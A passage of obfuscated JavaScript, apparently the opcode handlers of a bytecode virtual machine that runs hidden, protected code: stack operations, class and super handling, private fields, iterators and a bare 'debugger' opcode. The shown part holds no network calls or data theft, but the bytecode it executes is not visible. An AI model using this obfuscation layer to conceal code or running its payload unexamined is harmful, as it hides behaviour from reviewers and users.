                                                            '\x27caller\x27,\x20\x27callee\x27,\x20and\x20\x27arguments\x27\x20properties\x20may\x20not\x20be\x20accessed\x20on\x20strict\x20mode\x20functions\x20or\x20the\x20arguments\x20objects\x20for\x20calls\x20to\x20them'
                                                        );
                                                    };
                                                    vmD(xe, 'callee', {
                                                        get: u1,
                                                        set: u1,
                                                        enumerable: ![],
                                                        configurable: ![],
                                                    });
                                                } else
                                                    vmD(xe, 'callee', {
                                                        value: X,
                                                        writable: !![],
                                                        enumerable: ![],
                                                        configurable: !![],
                                                    });
                                            } else {
                                                let u2 = A ? A['length'] : 0x0,
                                                    u3 = {},
                                                    u4 = function (u8) {
                                                        return typeof u8 === 'string'
                                                            ? parseInt(u8, 0xa)
                                                            : NaN;
                                                    },
                                                    u5 = function (u8) {
                                                        return !isNaN(u8) && u8 >= 0x0;
                                                    },
                                                    u6 = function (u8) {
                                                        return u8 < A['length'] ? A[u8] : u3[u8];
                                                    },
                                                    u7 = function (u8) {
                                                        return u8 < A['length']
                                                            ? u8 in A
                                                            : u8 in u3;
                                                    };
                                                xe = new Proxy([], {
                                                    get: function (u8, u9, ux) {
                                                        if (u9 === 'length') return u2;
                                                        if (u9 === 'callee') return X;
                                                        if (u9 === Symbol['iterator'])
                                                            return function () {
                                                                let uG = 0x0;
                                                                return {
                                                                    next: function () {
                                                                        if (uG < u2)
                                                                            return {
                                                                                value: u6(uG++),
                                                                                done: ![],
                                                                            };
                                                                        return { done: !![] };
                                                                    },
                                                                };
                                                            };
                                                        let uu = u4(u9);
                                                        if (u5(uu)) return u6(uu);
                                                        if (u9 === 'hasOwnProperty')
                                                            return function (uG) {
                                                                if (
                                                                    uG === 'length' ||
                                                                    uG === 'callee'
                                                                )
                                                                    return !![];
                                                                let uk = u4(uG);
                                                                return u5(uk) && uk < u2 && u7(uk);
                                                            };
                                                        let uU = Array['prototype'][u9];
                                                        if (typeof uU === 'function')
                                                            return function () {
                                                                let uG = [];
                                                                for (let uk = 0x0; uk < u2; uk++) {
                                                                    uG[uk] = u6(uk);
                                                                }
                                                                return uU['apply'](uG, arguments);
                                                            };
                                                        return undefined;
                                                    },
                                                    set: function (u8, u9, ux) {
                                                        if (u9 === 'length')
                                                            return ((u2 = ux), !![]);
                                                        let uu = u4(u9);
                                                        if (u5(uu))
                                                            return (
                                                                uu < A['length']
                                                                    ? (A[uu] = ux)
                                                                    : (u3[uu] = ux),
                                                                uu >= u2 && (u2 = uu + 0x1),
                                                                !![]
                                                            );
                                                        return !![];
                                                    },
                                                    has: function (u8, u9) {
                                                        if (u9 === 'length' || u9 === 'callee')
                                                            return !![];
                                                        let ux = u4(u9);
                                                        if (u5(ux) && ux < u2) return u7(ux);
                                                        return u9 in Array['prototype'];
                                                    },
                                                    deleteProperty: function (u8, u9) {
                                                        let ux = u4(u9);
                                                        return (
                                                            u5(ux) &&
                                                                (ux < A['length']
                                                                    ? delete A[ux]
                                                                    : delete u3[ux]),
                                                            !![]
                                                        );
                                                    },
                                                    getOwnPropertyDescriptor: function (u8, u9) {
                                                        if (u9 === 'callee')
                                                            return {
                                                                value: X,
                                                                writable: !![],
                                                                enumerable: ![],
                                                                configurable: !![],
                                                            };
                                                        if (u9 === 'length')
                                                            return {
                                                                value: u2,
                                                                writable: !![],
                                                                enumerable: ![],
                                                                configurable: !![],
                                                            };
                                                        let ux = u4(u9);
                                                        if (u5(ux) && ux < u2 && u7(ux))
                                                            return {
                                                                value: u6(ux),
                                                                writable: !![],
                                                                enumerable: !![],
                                                                configurable: !![],
                                                            };
                                                        return undefined;
                                                    },
                                                    ownKeys: function (u8) {
                                                        let u9 = [];
                                                        for (let ux = 0x0; ux < u2; ux++) {
                                                            u7(ux) && u9['push'](String(ux));
                                                        }
                                                        return (u9['push']('length', 'callee'), u9);
                                                    },
                                                });
                                            }
                                        }
                                        (xR(xe), c++);
                                        break;
                                    }
                                },
                                function (xc) {
                                    while (!![]) {
                                        let xl = xE();
                                        if (xc >= 0x0) {
                                            let u0 = l[xc];
                                            xn['_$3NkOio'][u0] = xl;
                                        }
                                        c++;
                                        break;
                                    }
                                },
                                function (xc) {
                                    while (!![]) {
                                        let xl = xE(),
                                            u0 = xD();
                                        if (Array['isArray'](xl))
                                            Array['prototype']['push']['apply'](u0, xl);
                                        else
                                            for (let u1 of xl) {
                                                u0['push'](u1);
                                            }
                                        c++;
                                        break;
                                    }
                                },
                                function (xc) {
                                    while (!![]) {
                                        let xl = xv(0x3),
                                            u0 = xv(0x2),
                                            u1 = xD();
                                        (xo(0x3, u0), xo(0x2, u1), xC(xl), c++);
                                        break;
                                    }
                                },
                                function (xc) {
                                    while (!![]) {
                                        (xR([]), c++);
                                        break;
                                    }
                                },
                                function (xc) {
                                    while (!![]) {
                                        let xl = xE(),
                                            u0 = xE(),
                                            u1 = xc,
                                            u2 = (function (u3, u4) {
                                                let u5 = function () {
                                                    if (u3) {
                                                        u4 && (vmy_6c9c4d['_$AvDtgw'] = u5);
                                                        let u6 = '_$4gk5HF' in vmy_6c9c4d;
                                                        !u6 &&
                                                            (vmy_6c9c4d['_$4gk5HF'] = new.target);
                                                        try {
                                                            let u7 = u3['apply'](
                                                                this,
                                                                v(arguments)
                                                            );
                                                            if (
                                                                u4 &&
                                                                u7 !== undefined &&
                                                                (typeof u7 !== 'object' ||
                                                                    u7 === null)
                                                            )
                                                                throw new TypeError(
                                                                    'Derived\x20constructors\x20may\x20only\x20return\x20object\x20or\x20undefined'
                                                                );
                                                            return u7;
                                                        } finally {
                                                            (u4 && delete vmy_6c9c4d['_$AvDtgw'],
                                                                !u6 &&
                                                                    delete vmy_6c9c4d['_$4gk5HF']);
                                                        }
                                                    }
                                                };
                                                return u5;
                                            })(u0, u1);
                                        xl && vmD(u2, 'name', { value: xl, configurable: !![] });
                                        (xR(u2), c++);
                                        break;
                                    }
                                },
                                function (xc) {
                                    while (!![]) {
                                        let xl = xE();
                                        xl && typeof xl['return'] === 'function' && xl['return']();
                                        c++;
                                        break;
                                    }
                                },
                                function (xc) {
                                    while (!![]) {
                                        (xR(l[xc]), c++);
                                        break;
                                    }
                                },
                                function (xc) {
                                    while (!![]) {
                                        let xl = xE(),
                                            u0 = D(xE, xl),
                                            u1 = xE();
                                        if (xc === 0x1) {
                                            (xR(u0), c++);
                                            break;
                                        }
                                        if (vmy_6c9c4d['_$3nldEM']) {
                                            c++;
                                            break;
                                        }
                                        let u2 = vmy_6c9c4d['_$PTsoWy'];
                                        if (u2) {
                                            let u3 = u2['parent'],
                                                u4 = u2['newTarget'],
                                                u5 = Reflect['construct'](u3, u0, u4);
                                            W &&
                                                W !== u5 &&
                                                vmo(W)['forEach'](function (u6) {
                                                    !(u6 in u5) && (u5[u6] = W[u6]);
                                                });
                                            ((W = u5), (xt = !![]));
                                            xa &&
                                                (L(xn, '__this__'),
                                                (xn['_$3NkOio']['__this__'] = W));
                                            c++;
                                            break;
                                        }
                                        if (typeof u1 !== 'function')
                                            throw new TypeError(
                                                'Super\x20expression\x20must\x20be\x20a\x20constructor'
                                            );
                                        vmy_6c9c4d['_$4gk5HF'] = w;
                                        try {
                                            let u6 = u1['apply'](W, u0);
                                            (u6 !== undefined &&
                                                u6 !== W &&
                                                typeof u6 === 'object' &&
                                                (W && Object['assign'](u6, W), (W = u6)),
                                                (xt = !![]),
                                                xa &&
                                                    (L(xn, '__this__'),
                                                    (xn['_$3NkOio']['__this__'] = W)));
                                        } catch (u7) {
                                            if (
                                                u7 instanceof TypeError &&
                                                (u7['message']['includes']('\x27new\x27') ||
                                                    u7['message']['includes']('constructor'))
                                            ) {
                                                let u8 = Reflect['construct'](u1, u0, w);
                                                (u8 !== W && W && Object['assign'](u8, W),
                                                    (W = u8),
                                                    (xt = !![]),
                                                    xa &&
                                                        (L(xn, '__this__'),
                                                        (xn['_$3NkOio']['__this__'] = W)));
                                            } else throw u7;
                                        } finally {
                                            delete vmy_6c9c4d['_$4gk5HF'];
                                        }
                                        c++;
                                        break;
                                    }
                                },
                                function (xc) {
                                    while (!![]) {
                                        if (xK && !xt)
                                            throw new ReferenceError(
                                                'Must\x20call\x20super\x20constructor\x20in\x20derived\x20class\x20before\x20accessing\x20\x27this\x27\x20or\x20returning\x20from\x20derived\x20constructor'
                                            );
                                        (xR(W), c++);
                                        break;
                                    }
                                },
                                function (xc) {
                                    while (!![]) {
                                        c = xB(x1[c]);
                                        break;
                                    }
                                },
                                function (xc) {
                                    while (!![]) {
                                        let xl = xE(),
                                            u0 = l[xc];
                                        if (vmy_6c9c4d['_$S66XRr'] && u0 in vmy_6c9c4d['_$S66XRr'])
                                            throw new ReferenceError(
                                                'Cannot\x20access\x20\x27' +
                                                    u0 +
                                                    '\x27\x20before\x20initialization'
                                            );
                                        let u1 = !(u0 in vmy_6c9c4d) && !(u0 in vmV);
                                        vmy_6c9c4d[u0] = xl;
                                        u0 in vmV && (vmV[u0] = xl);
                                        u1 && (vmV[u0] = xl);
                                        (xR(xl), c++);
                                        break;
                                    }
                                },
                                function (xc) {
                                    while (!![]) {
                                        let xl = xE(),
                                            u0 = xE();
                                        (xR(u0 != xl), c++);
                                        break;
                                    }
                                },
                                function (xc) {
                                    while (!![]) {
                                        let xl = xE(),
                                            u0 = xE();
                                        (xR(u0 ** xl), c++);
                                        break;
                                    }
                                },
                                function (xc) {
                                    while (!![]) {
                                        let xl = xE(),
                                            u0 = xE(),
                                            u1 = xE();
                                        (vmD(u1, u0, {
                                            value: xl,
                                            writable: !![],
                                            enumerable: !![],
                                            configurable: !![],
                                        }),
                                            c++);
                                        break;
                                    }
                                },
                                function (xc) {
                                    while (!![]) {
                                        let xl = xE(),
                                            u0 = xD(),
                                            u1 = l[xc],
                                            u2 = o(u0);
                                        (vmD(u2, u1, {
                                            get: xl,
                                            enumerable: u2 === u0,
                                            configurable: !![],
                                        }),
                                            c++);
                                        break;
                                    }
                                },
                                function (xc) {
                                    while (!![]) {
                                        let xl = xE(),
                                            u0 = xE();
                                        (xR(u0 >>> xl), c++);
                                        break;
                                    }
                                },
                                function (xc) {
                                    while (!![]) {
                                        let xl = xE(),
                                            u0 = xE();
                                        (xR(u0 << xl), c++);
                                        break;
                                    }
                                },
                                function (xc) {
                                    while (!![]) {
                                        (xR(!xE()), c++);
                                        break;
                                    }
                                },
                                function (xc) {
                                    while (!![]) {
                                        let xl = xE(),
                                            u0 = xE();
                                        (xR(u0 == xl), c++);
                                        break;
                                    }
                                },
                                function (xc) {
                                    while (!![]) {
                                        let xl = l[xc],
                                            u0;
                                        if (vmy_6c9c4d['_$S66XRr'] && xl in vmy_6c9c4d['_$S66XRr'])
                                            throw new ReferenceError(
                                                'Cannot\x20access\x20\x27' +
                                                    xl +
                                                    '\x27\x20before\x20initialization'
                                            );
                                        if (xl in vmy_6c9c4d) u0 = vmy_6c9c4d[xl];
                                        else {
                                            if (xl in vmV) u0 = vmV[xl];
                                            else
                                                throw new ReferenceError(
                                                    xl + '\x20is\x20not\x20defined'
                                                );
                                        }
                                        (xR(u0), c++);
                                        break;
                                    }
                                },
                                function (xc) {
                                    while (!![]) {
                                        let xl = xE(),
                                            u0 = u(xl),
                                            u1 = u0 && u0['a'],
                                            u2 = u0 && u0['s'],
                                            u3 = u0 && u0['g'],
                                            u4 = u0 && u0['m'],
                                            u5 = (u0 && u0['p']) || 0x0,
                                            u6 = u0 && u0['st'],
                                            u7 = u1 ? xm : undefined,
                                            u8 = xn,
                                            u9;
                                        if (u3) u9 = d(T, v, xl, u8, R, u6, vmV, G);
                                        else {
                                            if (u2) {
                                                if (u1) u9 = g(r, xl, u8, u7);
                                                else
                                                    u4
                                                        ? (u9 = N(r, v, xl, u8, u6, vmV, G))
                                                        : (u9 = m(r, v, xl, u8, u6, vmV, G));
                                            } else {
                                                if (u1) u9 = n(P, xl, u8, u7);
                                                else
                                                    u4
                                                        ? (u9 = J(P, v, xl, u8, u6, vmV, G))
                                                        : (u9 = t(P, v, xl, u8, u6, vmV, G));
                                            }
                                        }
                                        (E(u9, 'length', {
                                            value: u5,
                                            writable: ![],
                                            enumerable: ![],
                                            configurable: !![],
                                        }),
                                            xR(u9),
                                            c++);
                                        break;
                                    }
                                },
                                function (xc) {
                                    while (!![]) {
                                        let xl = xc & 0xffff,
                                            u0 = xc >> 0x10,
                                            u1 = l[xl],
                                            u2 = l[u0];
                                        (xR(new RegExp(u1, u2)), c++);
                                        break;
                                    }
                                },
                                function (xc) {
                                    while (!![]) {
                                        let xl = xE(),
                                            u0 = xE();
                                        (xR(u0 >= xl), c++);
                                        break;
                                    }
                                },
                                function (xc) {
                                    while (!![]) {
                                        (xR(vmR[xc]), c++);
                                        break;
                                    }
                                },
                                function (xc) {
                                    while (!![]) {
                                        ((O[xc] = O[xc] - 0x1), c++);
                                        break;
                                    }
                                },
                                function (xc) {
                                    while (!![]) {
                                        let xl = xE(),
                                            u0 = l[xc],
                                            u1 = h(),
                                            u2 = 'get_' + u0,
                                            u3 = u1['get'](u2);
                                        if (u3 && u3['has'](xl)) {
                                            let u7 = u3['get'](xl);
                                            (xR(u7['call'](xl)), c++);
                                            break;
                                        }
                                        let u4 =
                                            '_$d9i5Pn' + 'get_' + u0['substring'](0x1) + '_$TYH1Y4';
                                        if (xl['constructor'] && u4 in xl['constructor']) {
                                            let u8 = xl['constructor'][u4];
                                            (xR(u8['call'](xl)), c++);
                                            break;
                                        }
                                        let u5 = u1['get'](u0);
                                        if (u5 && u5['has'](xl)) {
                                            (xR(u5['get'](xl)), c++);
                                            break;
                                        }
                                        let u6 = K(u0);
                                        if (u6 in xl) {
                                            (xR(xl[u6]), c++);
                                            break;
                                        }
                                        throw new TypeError(
                                            'Cannot\x20read\x20private\x20member\x20' +
                                                u0 +
                                                '\x20from\x20an\x20object\x20whose\x20class\x20did\x20not\x20declare\x20it'
                                        );
                                        break;
                                    }
                                },
                                function (xc) {
                                    while (!![]) {
                                        let xl = xE();
                                        xl !== null && xl !== undefined ? (c = xB(x1[c])) : c++;
                                        break;
                                    }
                                },
                                function (xc) {
                                    while (!![]) {
                                        let xl = xc & 0xffff,
                                            u0 = xc >>> 0x10;
                                        (xR(O[xl] < l[u0]), c++);
                                        break;
                                    }
                                },
                                function (xc) {
                                    while (!![]) {
                                        let xl = xE(),
                                            u0 = xE(),
                                            u1 = l[xc],
                                            u2 = h(),
                                            u3 = 'set_' + u1,
                                            u4 = u2['get'](u3);
                                        if (u4 && u4['has'](u0)) {
                                            let u8 = u4['get'](u0);
                                            (u8['call'](u0, xl), xR(xl), c++);
                                            break;
                                        }
                                        let u5 =
                                            '_$d9i5Pn' + 'set_' + u1['substring'](0x1) + '_$TYH1Y4';
                                        if (u0['constructor'] && u5 in u0['constructor']) {
                                            let u9 = u0['constructor'][u5];
                                            (u9['call'](u0, xl), xR(xl), c++);
                                            break;
                                        }
                                        let u6 = u2['get'](u1);
                                        if (u6 && u6['has'](u0)) {
                                            (u6['set'](u0, xl), xR(xl), c++);
                                            break;
                                        }
                                        let u7 = K(u1);
                                        if (u7 in u0) {
                                            ((u0[u7] = xl), xR(xl), c++);
                                            break;
                                        }
                                        throw new TypeError(
                                            'Cannot\x20write\x20private\x20member\x20' +
                                                u1 +
                                                '\x20to\x20an\x20object\x20whose\x20class\x20did\x20not\x20declare\x20it'
                                        );
                                        break;
                                    }
                                },
                                function (xc) {
                                    while (!![]) {
                                        let xl = xE();
                                        if (xl == null)
                                            throw new TypeError(
                                                'Cannot\x20iterate\x20over\x20' + xl
                                            );
                                        let u0 = xl[Symbol['iterator']];
                                        if (typeof u0 !== 'function')
                                            throw new TypeError('Object\x20is\x20not\x20iterable');
                                        (xR(u0['call'](xl)), c++);
                                        break;
                                    }
                                },
                                function (xc) {
                                    while (!![]) {
                                        let xl = xE(),
                                            u0 = xD(),
                                            u1 = l[xc];
                                        (vmD(u0['prototype'], u1, {
                                            value: xl,
                                            writable: !![],
                                            enumerable: ![],
                                            configurable: !![],
                                        }),
                                            c++);
                                        break;
                                    }
                                },
                                function (xc) {
                                    while (!![]) {
                                        ((O[xc] = xE()), c++);
                                        break;
                                    }
                                },
                                function (xc) {
                                    while (!![]) {
                                        let xl = xE(),
                                            u0 = xE();
                                        (xR(u0 > xl), c++);
                                        break;
                                    }
                                },
                                function (xc) {
                                    while (!![]) {
                                        let xl = xE(),
                                            u0 = xl['next']();
                                        (xR(u0), c++);
                                        break;
                                    }
                                },
                                function (xc) {
                                    while (!![]) {
                                        let xl = xE(),
                                            u0 = xE();
                                        u0 === null || u0 === undefined
                                            ? xR(undefined)
                                            : xR(u0[xl]);
                                        c++;
                                        break;
                                    }
                                },
                                function (xc) {
                                    while (!![]) {
                                        (xR(null), c++);
                                        break;
                                    }
                                },
                                function (xc) {
                                    while (!![]) {
                                        let xl = O[xc] + 0x1;
                                        ((O[xc] = xl), xR(xl), c++);
                                        break;
                                    }
                                },
                                function (xc) {
                                    while (!![]) {
                                        let xl = xE(),
                                            u0 = xE(),
                                            u1 = vmy_6c9c4d['_$nqVw0B'],
                                            u2 = u1 ? vmL(u1) : B(u0),
                                            u3 = z(u2, xl);
                                        if (u3['desc'] && u3['desc']['get']) {
                                            let u5 = u3['desc']['get']['call'](u0);
                                            (xR(u5), c++);
                                            break;
                                        }
                                        if (
                                            u3['desc'] &&
                                            u3['desc']['set'] &&
                                            !('value' in u3['desc'])
                                        ) {
                                            (xR(undefined), c++);
                                            break;
                                        }
                                        let u4 = u3['proto'] ? u3['proto'][xl] : u2[xl];
                                        if (typeof u4 === 'function') {
                                            let u6 = u3['proto'] || u2,
                                                u7 = u4['bind'](u0),
                                                u8 = u4['constructor'] && u4['constructor']['name'],
                                                u9 =
                                                    u8 === 'GeneratorFunction' ||
                                                    u8 === 'AsyncFunction' ||
                                                    u8 === 'AsyncGeneratorFunction';
                                            (!u9 &&
                                                (!vmy_6c9c4d['_$tMAf0M'] &&
                                                    (vmy_6c9c4d['_$tMAf0M'] = new WeakMap()),
                                                vmy_6c9c4d['_$tMAf0M']['set'](u7, u6)),
                                                xR(u7));
                                        } else xR(u4);
                                        c++;
                                        break;
                                    }
                                },
                                function (xc) {
                                    while (!![]) {
                                        (x6['pop'](), c++);
                                        break;
                                    }
                                },
                                function (xc) {
                                    while (!![]) {
                                        let xl = l[xc],
                                            u0 = xE(),
                                            u1 = xn,
                                            u2 = ![];
                                        while (u1) {
                                            if (u1['_$3NkOio'] && xl in u1['_$3NkOio']) {
                                                if (u1['_$NJY3Sg'] && xl in u1['_$NJY3Sg']) break;
                                                u1['_$3NkOio'][xl] = u0;
                                                !u1['_$NJY3Sg'] && (u1['_$NJY3Sg'] = {});
                                                ((u1['_$NJY3Sg'][xl] = !![]), (u2 = !![]));
                                                break;
                                            }
                                            u1 = u1['_$lQV5eu'];
                                        }
                                        !u2 &&
                                            (j(xn, xl),
                                            (xn['_$3NkOio'][xl] = u0),
                                            !xn['_$NJY3Sg'] && (xn['_$NJY3Sg'] = {}),
                                            (xn['_$NJY3Sg'][xl] = !![]));
                                        c++;
                                        break;
                                    }
                                },
                                function (xc) {
                                    while (!![]) {
                                        (xR(-xE()), c++);
                                        break;
                                    }
                                },
                                function (xc) {
                                    while (!![]) {
                                        let xl = xE(),
                                            u0 = xE(),
                                            u1 = xE();
                                        if (typeof u0 !== 'function')
                                            throw new TypeError(
                                                u0 + '\x20is\x20not\x20a\x20function'
                                            );
                                        let u2 = vmy_6c9c4d['_$tMAf0M'],
                                            u3 = u2 && u2['get'](u0),
                                            u4 = vmy_6c9c4d['_$nqVw0B'];
                                        u3 &&
                                            ((vmy_6c9c4d['_$lg2MJY'] = !![]),
                                            (vmy_6c9c4d['_$nqVw0B'] = u3));
                                        try {
                                            let u5 = u0['apply'](u1, D(xE, xl));
                                            xR(u5);
                                        } finally {
                                            u3 &&
                                                ((vmy_6c9c4d['_$lg2MJY'] = ![]),
                                                (vmy_6c9c4d['_$nqVw0B'] = u4));
                                        }
                                        c++;
                                        break;
                                    }
                                },
                                function (xc) {
                                    while (!![]) {
                                        let xl = xE(),
                                            u0 = xE();
                                        (xR(u0 <= xl), c++);
                                        break;
                                    }
                                },
                                function (xc) {
                                    while (!![]) {
                                        let xl = xE();
                                        if (xl == null)
                                            throw new TypeError(
                                                'Cannot\x20iterate\x20over\x20' + xl
                                            );
                                        let u0 = xl[Symbol['asyncIterator']];
                                        if (typeof u0 === 'function') xR(u0['call'](xl));
                                        else {
                                            let u1 = xl[Symbol['iterator']];
                                            if (typeof u1 !== 'function')
                                                throw new TypeError(
                                                    'Object\x20is\x20not\x20async\x20iterable'
                                                );
                                            xR(u1['call'](xl));
                                        }
                                        c++;
                                        break;
                                    }
                                },
                                function (xc) {
                                    while (!![]) {
                                        let xl = l[xc],
                                            u0 = xE(),
                                            u1 = xn['_$lQV5eu'];
                                        u1 && (u1['_$3NkOio'][xl] = u0);
                                        c++;
                                        break;
                                    }
                                },
                                function (xc) {
                                    while (!![]) {
                                        (xR(O[xc]), c++);
                                        break;
                                    }
                                },
                                function (xc) {
                                    while (!![]) {
                                        let xl = xc & 0xffff,
                                            u0 = xc >>> 0x10;
                                        (xR(O[xl] - l[u0]), c++);
                                        break;
                                    }
                                },
                                function (xc) {
                                    while (!![]) {
                                        let xl = xE();
                                        xE();
                                        let u0 = xD(),
                                            u1 = l[xc],
                                            u2 = h();
                                        !u2['has'](u1) && u2['set'](u1, new WeakMap());
                                        let u3 = u2['get'](u1);
                                        (u3['set'](u0, xl), c++);
                                        break;
                                    }
                                },
                                function (xc) {
                                    while (!![]) {
                                        let xl = xE(),
                                            u0 = xE();
                                        (xR(u0 instanceof xl), c++);
                                        break;
                                    }
                                },
                                function (xc) {
                                    while (!![]) {
                                        let xl = xE();
                                        (xR(C(xl)), c++);
                                        break;
                                    }
                                },
                                function (xc) {
                                    while (!![]) {
                                        (xR(typeof xE()), c++);
                                        break;
                                    }
                                },
                                function (xc) {
                                    while (!![]) {
                                        let xl = l[xc];
                                        (xR(Symbol['for'](xl)), c++);
                                        break;
                                    }
                                },
                                function (xc) {
                                    while (!![]) {
                                        let xl = xE(),
                                            u0 = xD();
                                        xl !== null && xl !== undefined && Object['assign'](u0, xl);
                                        c++;
                                        break;
                                    }
                                },
                                function (xc) {
                                    while (!![]) {
                                        let xl = xE(),
                                            u0 = xE();
                                        (xR(u0 % xl), c++);
                                        break;
                                    }
                                },
                                function (xc) {
                                    while (!![]) {
                                        let xl = xE(),
                                            u0 = xE(),
                                            u1 = xD();
                                        (vmD(u1, u0, {
                                            get: xl,
                                            enumerable: ![],
                                            configurable: !![],
                                        }),
                                            c++);
                                        break;
                                    }
                                },
                                function (xc) {
                                    while (!![]) {
                                        let xl = xB(x1[c]);
                                        if (x6['length'] > 0x0) {
                                            let u0 = x6[x6['length'] - 0x1];
                                            if (
                                                u0['_$Vdn9lU'] !== undefined &&
                                                xl >= u0['_$2AXo24']
                                            ) {
                                                ((x9['_$Mn6sWY'] = !![]),
                                                    (x9['_$2fOqlh'] = xl),
                                                    (c = u0['_$Vdn9lU']));
                                                break;
                                            }
                                        }
                                        c = xl;
                                        break;
                                    }
                                },
                                function (xc) {
                                    while (!![]) {
                                        let xl = xE(),
                                            u0 = xE(),
                                            u1 = l[xc];
                                        (vmD(u0, u1, {
                                            value: xl,
                                            writable: !![],
                                            enumerable: !![],
                                            configurable: !![],
                                        }),
                                            c++);
                                        break;
                                    }
                                },
                                function (xc) {
                                    while (!![]) {
                                        let xl = xD();
                                        (xC(xv(0x2)), xo(0x2, xl), c++);
                                        break;
                                    }
                                },
                                function (xc) {
                                    while (!![]) {
                                        let xl = xE();
                                        (xR(xl), xR(xl), c++);
                                        break;
                                    }
                                },
                                function (xc) {
                                    while (!![]) {
                                        c++;
                                        break;
                                    }
                                },
                                function (xc) {
                                    while (!![]) {
                                        (xR(~xE()), c++);
                                        break;
                                    }
                                },
                                function (xc) {
                                    while (!![]) {
                                        let xl = xE(),
                                            u0 = xE(),
                                            u1 = xE();
                                        if (u1 === null || u1 === undefined)
                                            throw new TypeError(
                                                'Cannot\x20set\x20property\x20\x27' +
                                                    String(u0) +
                                                    '\x27\x20of\x20' +
                                                    u1
                                            );
                                        (f(u1, u0, xl, xI), xR(xl), c++);
                                        break;
                                    }
                                },
                                function (xc) {
                                    while (!![]) {
                                        let xl, u0;
                                        xc !== undefined
                                            ? ((u0 = xE()), (xl = l[xc]))
                                            : ((xl = xE()), (u0 = xE()));
                                        let u1 = delete u0[xl];
                                        if (xI && !u1)
                                            throw new TypeError(
                                                'Cannot\x20delete\x20property\x20\x27' +
                                                    String(xl) +
                                                    '\x27\x20of\x20object'
                                            );
                                        (xR(u1), c++);
                                        break;
                                    }
                                },
                                function (xc) {
                                    while (!![]) {
                                        if (x6['length'] > 0x0) {
                                            let xl = x6[x6['length'] - 0x1];
                                            if (xl['_$Vdn9lU'] !== undefined) {
                                                ((x8['_$csazO3'] = !![]),
                                                    (x8['_$VmqNsa'] = xE()),
                                                    (c = xl['_$Vdn9lU']));
                                                break;
                                            }
                                        }
                                        x8['_$csazO3'] &&
                                            ((x8['_$csazO3'] = ![]), (x8['_$VmqNsa'] = undefined));
                                        ((xf = !![]), (xh = xE()));
                                        return;
                                        break;
                                    }
                                },
                                function (xc) {
                                    while (!![]) {
                                        let xl = xE();
                                        (xR(typeof xl === 'bigint' ? xl : +xl), c++);
                                        break;
                                    }
                                },
                                function (xc) {
                                    while (!![]) {
                                        (xR({}), c++);
                                        break;
                                    }
                                },
                                function (xc) {
                                    while (!![]) {
                                        (xR(+xE()), c++);
                                        break;
                                    }
                                },
                                function (xc) {
                                    while (!![]) {
                                        let xl = xE();
                                        (xR(!!xl['done']), c++);
                                        break;
                                    }
                                },
                                function (xc) {
                                    while (!![]) {
                                        ((O[xc] = xE()), c++);
                                        break;
                                    }
                                },
                                function (xc) {
                                    while (!![]) {
                                        let xl = xE(),
                                            u0 = xD();
                                        if (xl === null) {
                                            (vmz(u0['prototype'], null),
                                                vmz(u0, Function['prototype']),
                                                (u0['_$90oo3b'] = null),
                                                c++);
                                            break;
                                        }
                                        let u1 = ![];
                                        try {
                                            let u2 = vmC(xl['prototype']),
                                                u3 = xl['apply'](u2, []);
                                            u3 !== undefined && u3 !== u2 && (u1 = !![]);
                                        } catch (u4) {
                                            u4 instanceof TypeError &&
                                                (u4['message']['includes']('\x27new\x27') ||
                                                    u4['message']['includes']('constructor') ||
                                                    u4['message']['includes'](
                                                        'Illegal\x20constructor'
                                                    )) &&
                                                (u1 = !![]);
                                        }
                                        if (u1) {
                                            let u5 = u0,
                                                u6 = vmy_6c9c4d,
                                                u7 = '_$4gk5HF',
                                                u8 = '_$AvDtgw',
                                                u9 = '_$PTsoWy';
                                            function ux(...uu) {
                                                let uU = vmC(xl['prototype']);
                                                ((u6[u9] = {
                                                    parent: xl,
                                                    newTarget: new.target || ux,
                                                }),
                                                    (u6[u8] = new.target || ux));
                                                let uG = u7 in u6;
                                                !uG && (u6[u7] = new.target);
                                                try {
                                                    let uk = u5['apply'](uU, uu);
                                                    uk !== undefined &&
                                                        typeof uk === 'object' &&
                                                        (uU = uk);
                                                } finally {
                                                    (delete u6[u9],
                                                        delete u6[u8],
                                                        !uG && delete u6[u7]);
                                                }
                                                return uU;
                                            }
                                            ((ux['prototype'] = vmC(xl['prototype'])),
                                                (ux['prototype']['constructor'] = ux),
                                                vmz(ux, xl),
                                                vmo(u5)['forEach'](function (uu) {
                                                    uu !== 'prototype' &&
                                                        uu !== 'length' &&
                                                        uu !== 'name' &&
                                                        E(ux, uu, vmv(u5, uu));
                                                }));
                                            u5['prototype'] &&
                                                (vmo(u5['prototype'])['forEach'](function (uu) {
                                                    uu !== 'constructor' &&
                                                        E(
                                                            ux['prototype'],
                                                            uu,
                                                            vmv(u5['prototype'], uu)
                                                        );
                                                }),
                                                vmB(u5['prototype'])['forEach'](function (uu) {
                                                    E(
                                                        ux['prototype'],
                                                        uu,
                                                        vmv(u5['prototype'], uu)
                                                    );
                                                }));
                                            (xE(), xR(ux), (ux['_$90oo3b'] = xl), c++);
                                            break;
                                        }
                                        (vmz(u0['prototype'], xl['prototype']),
                                            vmz(u0, xl),
                                            (u0['_$90oo3b'] = xl),
                                            c++);
                                        break;
                                    }
                                },
                                function (xc) {
                                    while (!![]) {
                                        (xE(), xR(undefined), c++);
                                        break;
                                    }
                                },
                                function (xc) {
                                    while (!![]) {
                                        debugger;
                                        c++;
                                        break;
                                    }
                                },
                                function (xc) {
                                    while (!![]) {
                                        let xl = xE(),
                                            u0 = xD(),
                                            u1 = l[xc];
                                        (vmD(u0, u1, {
                                            value: xl,
                                            writable: !![],
                                            enumerable: ![],
                                            configurable: !![],
                                        }),
                                            c++);
                                        break;
                                    }
                                },
                                function (xc) {
                                    while (!![]) {
                                        let xl = xE(),
                                            u0 = xE(),
                                            u1 = xD();
                                        (vmD(u1, u0, {
                                            value: xl,
                                            writable: !![],
                                            enumerable: ![],
                                            configurable: !![],
                                        }),
                                            c++);
                                        break;
                                    }
                                },
                                function (xc) {
                                    while (!![]) {
                                        let xl = xE(),
                                            u0 = xE();
                                        (xR(u0 === xl), c++);
                                        break;
                                    }
                                },
                                function (xc) {
                                    while (!![]) {
                                        let xl = xE(),
                                            u0 = xE();
                                        (xR(u0 !== xl), c++);
                                        break;
                                    }
                                },
                                function (xc) {
                                    while (!![]) {
                                        let xl = xc & 0xffff,
                                            u0 = xc >>> 0x10;
                                        O[xl] < l[u0] ? (c = xB(x1[c])) : c++;
                                        break;
                                    }
                                },
                                function (xc) {
                                    while (!![]) {
                                        let xl = xE(),
                                            u0 = {
                                                ['_$3NkOio']: vmC(null),
                                                ['_$NJY3Sg']: vmC(null),
                                                ['_$0SKFtw']: vmC(null),
